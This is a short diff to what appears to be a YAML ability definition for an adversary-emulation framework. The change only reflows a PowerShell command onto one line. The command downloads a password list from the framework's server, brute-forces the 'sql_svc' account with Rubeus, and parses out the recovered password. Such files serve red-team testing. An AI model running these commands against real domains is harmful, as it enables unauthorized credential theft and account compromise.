@@ -5,11 +5,7 @@
     windows:
       psh,pwsh:
         cleanup: Remove-Item passwordlist.txt;
-        command: 'Invoke-RestMethod -Uri #{server}/file/download -Headers @{"file"="passwordlist.txt"}
-          -OutFile .\passwordlist.txt;           $m=.\Rubeus.exe brute /user:"sql_svc"
-          /passwords:passwordlist.txt | Select-String -Pattern "STUPENDOUS\s+=>\s+(?<source>\S+):(?<target>\S+)"
-          -List;          $m.Matches.groups | ? { $_.Name -eq ''target'' } | Select-Object
-          -ExpandProperty Value;'
+        command: 'Invoke-RestMethod -Uri #{server}/file/download -Headers @{"file"="passwordlist.txt"} -OutFile .\passwordlist.txt; $m=.\Rubeus.exe brute /user:"sql_svc" /passwords:passwordlist.txt | Select-String -Pattern "STUPENDOUS\s+=>\s+(?<source>\S+):(?<target>\S+)" -List;          $m.Matches.groups | ? { $_.Name -eq ''target'' } | Select-Object -ExpandProperty Value;'
         parsers:
           plugins.stockpile.app.parsers.basic:
             - source: host.user.password
